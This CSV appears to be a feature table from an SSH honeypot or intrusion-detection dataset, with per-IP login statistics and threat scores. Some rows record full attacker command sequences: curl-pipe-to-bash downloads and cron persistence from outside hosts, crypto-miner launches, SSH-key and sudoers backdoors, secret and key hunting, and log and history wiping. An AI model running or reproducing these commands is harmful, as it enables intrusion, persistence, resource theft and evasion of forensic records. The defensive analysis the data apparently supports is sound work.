src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score
42.230.74.76,17,1,5,12,3,3,1,1,10,17,17,1,751.0,86620.0,56480.0,0,0,1,1,0,"['hostname', 'whoami', 'export HISTFILESIZE=0', 'export HISTSIZE=0', 'rm -rf /var/log/auth.log', 'unset HISTFILE', ""echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", 'exit']","hostname(1), whoami(1), export HISTFILESIZE=0(1), export HISTSIZE=0(1), rm -rf /var/log/auth.log(1)","hostname, whoami, export HISTFILESIZE=0, export HISTSIZE=0, rm -rf /var/log/auth.log, unset HISTFILE, echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys, (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -, echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers, exit",10,1,1,0,0.2777777777777778,0.6666666666666666,0.5,5.0,1.533613073422921,4.944444444444445,8.094659905244862,0.14413343169958814
44.86.98.246,9,1,9,0,5,5,1,1,0,9,9,0,12.0,388.0,157.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.4556962025316458,5.4,9.0,0.4864893567012054
46.11.148.169,10,1,10,0,6,5,1,1,0,10,10,0,14.0,1391.0,857.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,1.621212121212121,5.454545454545454,10.0,0.5577304279617998
47.131.32.224,26,1,3,23,1,1,1,1,21,26,26,0,275.0,22649.0,31570.0,26,0,1,1,0,"['cat /etc/hostname', 'hostname -f', 'hostname', 'last | head -20', 'env | grep -i secret', 'cat /home/ubuntu/TaskBoard/Backend/server.js', 'cat /etc/sudoers', 'cat /home/ubuntu/TaskBoard/.env', ""find / -name 'id_rsa' 2>/dev/null"", 'find / -perm -4000 -type f 2>/dev/null', 'ls /', ""find /home -name '*.env' 2>/dev/null"", ""find / -name '.env' -type f 2>/dev/null | head -10"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'crontab -e', 'systemctl restart sshd', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', 'rm -f ~/.bash_history', ""echo '' > ~/.bash_history"", 'truncate -s 0 /var/log/auth.log', 'logout']","cat /etc/hostname(1), hostname -f(1), hostname(1), last | head -20(1), env | grep -i secret(1)","cat /etc/hostname, hostname -f, hostname, last | head -20, env | grep -i secret, cat /home/ubuntu/TaskBoard/Backend/server.js, cat /etc/sudoers, cat /home/ubuntu/TaskBoard/.env, find / -name 'id_rsa' 2>/dev/null, find / -perm -4000 -type f 2>/dev/null",21,3,1,0,0.1111111111111111,0.8518518518518519,0.75,10.5,0.7173988787178106,6.962962962962963,6.249073654946983,0.1379606372099512
47.206.40.252,12,1,12,0,7,7,1,1,0,12,12,0,30.0,1178.0,1483.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.46153846153846156,0.0,0.793800539083558,5.538461538461538,12.0,0.5312206963308671
48.72.122.132,6,1,6,0,2,2,1,1,0,6,6,0,6.0,1017.0,373.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.7192513368983957,5.142857142857143,6.0,0.7633064392885845
49.156.156.127,11,1,11,0,7,7,1,1,0,11,11,0,4.0,386.0,1260.0,11,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,0.3061062648691515,6.416666666666667,11.0,0.522495442370686
49.96.92.137,12,1,12,0,7,6,1,1,0,12,12,0,21.0,2959.0,1340.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.46153846153846156,0.0,2.2065622669649514,4.615384615384615,12.0,0.49527523016083513
5.219.140.127,7,1,7,0,3,3,1,1,0,7,7,0,13.0,1265.0,883.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.4309954751131222,5.25,7.0,0.5654776776222771
5.219.96.57,8,1,8,0,4,4,1,1,0,8,8,0,10.0,732.0,1342.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,0.5450483991064781,5.333333333333333,8.0,0.480817649091958
5.222.34.149,11,1,11,0,6,6,1,1,0,11,11,0,24.0,707.0,413.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,1.7077294685990339,5.5,11.0,0.5262510867682456
5.5.125.14,8,1,8,0,3,3,1,1,0,8,8,0,4.0,630.0,725.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,0.8677685950413223,5.333333333333333,8.0,0.48890462300307896
50.132.101.80,11,1,11,0,6,7,1,1,0,11,11,0,30.0,1276.0,444.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.8674157303370786,5.5,11.0,0.5604441120576397
50.189.235.115,5,1,5,0,1,1,1,1,0,5,5,0,14.0,2300.0,1142.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.012248468941382,4.166666666666667,5.0,0.36522946816292806
50.69.91.64,10,1,10,0,5,4,1,1,0,10,10,0,27.0,1638.0,1084.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,1.5096774193548388,4.545454545454546,10.0,0.424443919791485
51.206.118.57,12,1,12,0,7,7,1,1,0,12,12,0,19.0,2316.0,529.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.46153846153846156,0.0,4.369811320754717,5.538461538461538,12.0,0.5135236681983145
52.130.74.229,6,1,6,0,2,2,1,1,0,6,6,0,10.0,1792.0,406.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,4.402948402948403,5.142857142857143,6.0,0.500118406060066
52.207.211.83,24,1,5,19,3,3,1,1,17,24,24,2,582.0,5164.0,12162.0,24,0,1,1,0,"['uname -s -r', 'last | head -20', 'uptime', 'who', 'hostname -f', ""mount | grep -v 'tmpfs\\|cgroup'"", 'nproc', 'cat /proc/version', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', '/tmp/payload.sh &', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'history -w', ""echo '' > /var/log/wtmp"", 'export HISTSIZE=0', 'truncate -s 0 /var/log/auth.log', 'quit']","uname -s -r(1), last | head -20(1), uptime(1), who(1), hostname -f(1)","uname -s -r, last | head -20, uptime, who, hostname -f, mount | grep -v 'tmpfs\|cgroup', nproc, cat /proc/version, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, /tmp/payload.sh &",17,4,1,0,0.2,0.76,0.5,8.5,0.4245663076543616,7.2,6.687472135532769,0.12678587630845797
52.208.31.15,12,1,12,0,7,7,1,1,0,12,12,0,8.0,891.0,430.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.46153846153846156,0.0,2.0672853828306264,5.538461538461538,12.0,0.519869621756435
53.125.203.231,7,1,7,0,3,3,1,1,0,7,7,0,24.0,841.0,1357.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.6192930780559647,4.375,7.0,0.38878790308941763
53.15.110.96,9,1,9,0,5,5,1,1,0,9,9,0,29.0,265.0,165.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.5963855421686748,4.5,9.0,0.39554019369683013
53.94.239.236,8,1,8,0,4,4,1,1,0,8,8,0,4.0,2104.0,492.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,4.267748478701826,6.222222222222222,8.0,0.43471549969788037
54.207.39.219,19,1,4,15,2,2,1,1,13,19,19,0,464.0,38714.0,22894.0,19,0,1,1,0,"['cat /etc/hostname', 'uname -s -r', 'hostname -f', 'hostname', 'history -c', ""pkill -f 'sshd: root'"", 'export HISTSIZE=0', 'export HISTFILESIZE=0', 'rm -f ~/.bash_history', 'crontab -e', 'service sshd restart', 'history -w', 'exit']","cat /etc/hostname(1), uname -s -r(1), hostname -f(1), hostname(1), history -c(1)","cat /etc/hostname, uname -s -r, hostname -f, hostname, history -c, pkill -f 'sshd: root', export HISTSIZE=0, export HISTFILESIZE=0, rm -f ~/.bash_history, crontab -e",13,0,0,0,0.2,0.75,0.6,6.5,1.6909368857829221,6.65,7.2960466946988465,0.1284760717867115
57.10.91.216,6,1,6,0,2,2,1,1,0,6,6,0,22.0,2651.0,180.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,14.646408839779005,6.0,6.0,0.4907077324250363
57.188.67.79,9,1,9,0,5,5,1,1,0,9,9,0,17.0,2149.0,714.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,3.0055944055944055,4.5,9.0,0.4421859657683393
57.60.128.206,10,1,10,0,5,6,1,1,0,10,10,0,19.0,555.0,1050.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,0.5280685061845861,4.545454545454546,10.0,0.5251030631826664
59.137.95.157,9,1,9,0,4,4,1,1,0,9,9,0,4.0,2869.0,1078.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,2.658943466172382,4.5,9.0,0.45454373433213535
6.119.128.182,7,1,7,0,3,3,1,1,0,7,7,0,17.0,727.0,950.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.7644584647739222,5.25,7.0,0.4112036598888343
60.4.192.122,8,1,8,0,3,4,1,1,0,8,8,0,28.0,2168.0,1267.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.7097791798107256,5.333333333333333,8.0,0.5282487002832165
60.49.111.88,6,1,6,0,2,2,1,1,0,6,6,0,25.0,1094.0,1042.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.0488974113135188,4.285714285714286,6.0,0.4454400198502352
60.56.99.43,5,1,5,0,1,1,1,1,0,5,5,0,27.0,2385.0,752.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.1673306772908365,5.0,5.0,0.45478714925084324
62.187.227.207,9,1,9,0,5,4,1,1,0,9,9,0,26.0,1787.0,1175.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.5195578231292517,4.5,9.0,0.48475589302366895
62.214.180.122,25,1,4,21,2,2,1,1,19,25,25,0,282.0,100483.0,48613.0,0,0,1,1,0,"['uname -a', 'hostname', 'cat /etc/os-release', 'ls -la /home', 'ls /home', 'ls /home/ubuntu/TaskBoard/frontend', 'ls -la /var/tmp', 'env | grep -i token', 'cat /home/ubuntu/notes.txt', ""grep -r 'mongoose\\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20"", ""echo 'root:H4ck3d!' | chpasswd"", 'service ssh restart', ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", 'crontab -l', ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'unset HISTFILE', ""echo '' > ~/.bash_history"", ""echo '' > /var/log/btmp"", 'logout']","uname -a(1), hostname(1), cat /etc/os-release(1), ls -la /home(1), ls /home(1)","uname -a, hostname, cat /etc/os-release, ls -la /home, ls /home, ls /home/ubuntu/TaskBoard/frontend, ls -la /var/tmp, env | grep -i token, cat /home/ubuntu/notes.txt, grep -r 'mongoose\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20",19,2,1,0,0.15384615384615385,0.8076923076923077,0.6,9.5,2.0669560208993296,4.961538461538462,8.51503471295818,0.14152609017668677
63.221.118.83,20,1,4,16,2,2,1,1,14,20,20,0,480.0,16432.0,34243.0,20,0,1,1,0,"['hostname -f', 'cat /etc/os-release', 'uname -s -r', 'cat /etc/hostname', 'whoami', 'cat /home/ubuntu/TaskBoard/Backend/.env', 'env | grep -i token', 'cat /home/ubuntu/TaskBoard/Backend/routes/auth.js', 'cat /home/ubuntu/TaskBoard/Backend/routes/tasks.js', 'ls -la /root', ""find / -name '*.key' 2>/dev/null | head -10"", ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", ""(crontab -l; echo '@reboot /tmp/.sshd &') | crontab -"", 'quit']","hostname -f(1), cat /etc/os-release(1), uname -s -r(1), cat /etc/hostname(1), whoami(1)","hostname -f, cat /etc/os-release, uname -s -r, cat /etc/hostname, whoami, cat /home/ubuntu/TaskBoard/Backend/.env, env | grep -i token, cat /home/ubuntu/TaskBoard/Backend/routes/auth.js, cat /home/ubuntu/TaskBoard/Backend/routes/tasks.js, ls -la /root",14,0,0,0,0.19047619047619047,0.7619047619047619,0.6,7.0,0.4798504847564537,6.666666666666667,8.882638143528627,0.14940747288636214
64.133.88.33,7,1,7,0,3,3,1,1,0,7,7,0,3.0,2575.0,948.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,2.713382507903056,5.25,7.0,0.38414273977462554
64.87.63.148,21,1,4,17,2,2,1,1,15,21,21,3,125.0,85323.0,7085.0,21,0,1,1,0,"['uname -s -r', 'hostname -f', 'last | head -20', 'dmesg | tail -20', 'free -m', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'history -w', ""echo '' > /var/log/btmp"", 'cat /dev/null > ~/.bash_history', 'truncate -s 0 /var/log/auth.log', 'logout']","uname -s -r(1), hostname -f(1), last | head -20(1), dmesg | tail -20(1), free -m(1)","uname -s -r, hostname -f, last | head -20, dmesg | tail -20, free -m, chmod +x /tmp/payload.sh && bash /tmp/payload.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://194.165.16.78/pnscan -O /tmp/pnscan, curl -fsSL http://176.97.66.164/b.sh | sh",15,6,1,1,0.18181818181818182,0.7727272727272727,0.6,7.5,12.041066892464013,7.7272727272727275,7.825941131531711,0.14312119648570612
66.71.89.103,5,1,5,0,1,1,1,1,0,5,5,0,23.0,2575.0,201.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,12.747524752475247,5.833333333333333,5.0,0.48628739104783414
68.161.110.231,21,1,4,17,2,2,1,1,13,21,21,4,493.0,23910.0,37257.0,21,0,1,1,0,"['who', 'id', 'uname -a', 'ls -la /dev/shm', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', 'quit']","who(1), id(1), uname -a(1), ls -la /dev/shm(1), find / -name '*.key' 2>/dev/null | head -10(1)","who, id, uname -a, ls -la /dev/shm, find / -name '*.key' 2>/dev/null | head -10, ls -la /root, curl -fsSL http://176.97.66.164/b.sh | sh, bash /tmp/install.sh > /dev/null 2>&1 &, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/",13,3,1,0,0.18181818181818182,0.7727272727272727,0.6,6.5,0.6417413709807289,7.318181818181818,8.876740122865357,0.14440990222455904
7.80.106.139,11,1,11,0,5,5,1,1,0,11,11,0,2.0,2529.0,1160.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5833333333333333,0.0,2.1782945736434107,5.5,11.0,0.5157079708132744
70.130.26.103,23,1,3,20,1,1,1,1,17,23,23,3,39.0,114652.0,38202.0,23,0,1,1,0,"['whoami', 'last | head -20', 'uptime', 'w', 'who', 'ls -la /var/tmp', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -fsSL http://176.97.66.164/b.sh | sh', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', 'cat /proc/cpuinfo | grep processor | wc -l', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', ""echo '' > /var/log/wtmp"", 'cat /dev/null > ~/.bash_history', 'exit']","whoami(1), last | head -20(1), uptime(1), w(1), who(1)","whoami, last | head -20, uptime, w, who, ls -la /var/tmp, ls -la /home/ubuntu/TaskBoard/Backend/, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -fsSL http://176.97.66.164/b.sh | sh",17,3,1,0,0.125,0.8333333333333334,0.75,8.5,3.001125566055022,7.208333333333333,7.745498630506039,0.14486716738561445
70.167.183.95,10,1,10,0,6,6,1,1,0,10,10,0,25.0,1684.0,1220.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,1.3791973791973793,5.454545454545454,10.0,0.46507283740015004
72.142.192.146,7,1,7,0,3,3,1,1,0,7,7,0,10.0,457.0,128.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,3.5426356589147288,4.375,7.0,0.4936235156495079
72.75.125.203,10,1,10,0,6,5,1,1,0,10,10,0,28.0,2672.0,1162.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,2.2975064488392087,4.545454545454546,10.0,0.4373794728402534
73.77.40.254,8,1,8,0,4,3,1,1,0,8,8,0,13.0,787.0,341.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.301169590643275,4.444444444444445,8.0,0.4032702219453248
75.177.128.226,8,1,8,0,4,4,1,1,0,8,8,0,25.0,1334.0,818.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.6288156288156288,5.333333333333333,8.0,0.5207170727794885
75.5.230.45,18,1,3,15,1,1,1,1,13,18,18,0,540.0,67656.0,55737.0,18,0,1,1,0,"['whoami', 'id', 'uptime', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'free -m', 'cat /etc/hosts', 'ifconfig', 'arp -a', 'top -bn1 | head -20', 'ps -ef', 'ls -la /home/ubuntu/TaskBoard', 'ls /home/ubuntu/TaskBoard/frontend', 'exit']","whoami(1), id(1), uptime(1), sysctl -a 2>/dev/null | grep -i 'net\|kernel'(1), free -m(1)","whoami, id, uptime, sysctl -a 2>/dev/null | grep -i 'net\|kernel', free -m, cat /etc/hosts, ifconfig, arp -a, top -bn1 | head -20, ps -ef",13,0,0,0,0.15789473684210525,0.7894736842105263,0.75,6.5,1.2138218091786572,6.631578947368421,7.6103500761035,0.11770820852206687
76.102.134.71,10,1,10,0,6,6,1,1,0,10,10,0,2.0,249.0,1421.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,0.1751054852320675,5.454545454545454,10.0,0.503217189063752
76.165.206.93,7,1,7,0,3,3,1,1,0,7,7,0,13.0,2971.0,238.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,12.430962343096235,5.25,7.0,0.5099118987187984
76.235.245.246,8,1,8,0,4,4,1,1,0,8,8,0,27.0,2200.0,417.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,5.2631578947368425,5.333333333333333,8.0,0.48330124770590605
76.9.20.152,5,1,5,0,1,1,1,1,0,5,5,0,4.0,888.0,1195.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.7424749163879598,5.833333333333333,5.0,0.3313865733734913
76.97.222.47,5,1,5,0,1,1,1,1,0,5,5,0,6.0,2281.0,608.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.7454844006568146,5.0,5.0,0.452681576990448
78.131.99.41,8,1,8,0,4,4,1,1,0,8,8,0,18.0,2924.0,1270.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.3005507474429585,4.444444444444445,8.0,0.430547035314456
78.70.224.80,10,1,10,0,6,6,1,1,0,10,10,0,30.0,1329.0,1228.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,1.081366965012205,4.545454545454546,10.0,0.5043857799218449
79.72.156.117,6,1,6,0,2,2,1,1,0,6,6,0,11.0,1480.0,1458.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.0143934201507883,4.285714285714286,6.0,0.4118129990405929
8.70.86.64,11,1,11,0,6,7,1,1,0,11,11,0,6.0,2143.0,901.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.3758314855875833,5.5,11.0,0.5061078320362545
8.77.239.54,9,1,9,0,4,5,1,1,0,9,9,0,19.0,1345.0,1364.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,0.9853479853479854,4.5,9.0,0.5033496570118372
80.110.109.39,11,1,11,0,5,7,1,1,0,11,11,0,26.0,611.0,701.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5833333333333333,0.0,0.8703703703703703,4.583333333333333,11.0,0.47882469893612145
80.139.185.131,7,1,7,0,3,2,1,1,0,7,7,0,6.0,2284.0,1333.0,7,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.712143928035982,6.125,7.0,0.49454420686970557
82.186.235.246,11,1,11,0,7,6,1,1,0,11,11,0,14.0,1428.0,627.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,2.2738853503184715,5.5,11.0,0.5217294961535589
84.176.221.115,10,1,10,0,5,6,1,1,0,10,10,0,6.0,2937.0,1401.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,2.0948644793152638,6.363636363636363,10.0,0.4694321326434166
84.93.166.101,9,1,9,0,4,4,1,1,0,9,9,0,19.0,318.0,715.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,0.4441340782122905,4.5,9.0,0.5732486548726358
86.127.200.2,10,1,10,0,5,5,1,1,0,10,10,0,5.0,1155.0,1440.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,0.8015267175572519,6.363636363636363,10.0,0.415936003504221
86.77.63.189,29,1,4,25,2,2,1,1,23,29,29,1,783.0,3933.0,3614.0,29,0,1,1,0,"['who', 'cat /etc/os-release', 'cat /etc/hostname', 'uname -a', 'w', 'dmesg | tail -20', ""mount | grep -v 'tmpfs\\|cgroup'"", 'df -h', 'free -m', ""cat /proc/cpuinfo | grep 'model name' | head -1"", 'arp -a', 'ip a', 'cat /etc/hosts', 'wget -qO- ipinfo.io', 'ss -antp', 'ps aux | grep -v grep', 'ps aux', 'pstree -a', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'ls -la /home/ubuntu/TaskBoard', 'find / -perm -4000 -type f 2>/dev/null', 'logout']","who(1), cat /etc/os-release(1), cat /etc/hostname(1), uname -a(1), w(1)","who, cat /etc/os-release, cat /etc/hostname, uname -a, w, dmesg | tail -20, mount | grep -v 'tmpfs\|cgroup', df -h, free -m, cat /proc/cpuinfo | grep 'model name' | head -1",23,1,1,0,0.13333333333333333,0.8333333333333334,0.6,11.5,1.087966804979253,6.9,7.246467347168256,0.1413974633269893
87.182.231.243,5,1,5,0,1,1,1,1,0,5,5,0,13.0,1390.0,1270.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.093627065302911,5.0,5.0,0.35278625117495743
87.186.247.169,7,1,7,0,3,3,1,1,0,7,7,0,15.0,2552.0,1459.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.747945205479452,5.25,7.0,0.4337737040621097
87.251.60.203,11,1,11,0,7,7,1,1,0,11,11,0,26.0,2776.0,1054.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,2.6312796208530806,4.583333333333333,11.0,0.4776052661070734
87.45.32.237,28,1,5,23,3,3,1,1,19,28,28,2,289.0,114512.0,716.0,0,28,1,1,0,"['last | head -20', 'id', 'journalctl -n 50 --no-pager', 'nproc', 'dmesg | tail -20', 'cat /proc/version', 'netstat -antp', 'ip route show', 'cat /etc/resolv.conf', 'ss -tulnp', 'ps aux | grep -v grep', 'ls -la /proc/ | head -20', 'ps -ef', 'pstree -a', 'cat /proc/1/cmdline', 'ls /home/ubuntu/TaskBoard/frontend', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'exit']","last | head -20(1), id(1), journalctl -n 50 --no-pager(1), nproc(1), dmesg | tail -20(1)","last | head -20, id, journalctl -n 50 --no-pager, nproc, dmesg | tail -20, cat /proc/version, netstat -antp, ip route show, cat /etc/resolv.conf, ss -tulnp",19,0,0,0,0.1724137931034483,0.7931034482758621,0.5,9.5,159.70990237099025,5.931034482758621,8.272601930273783,0.15078300287409732
89.181.16.220,5,1,5,0,1,1,1,1,0,5,5,0,6.0,1674.0,377.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,4.428571428571429,5.833333333333333,5.0,0.4721430331562996
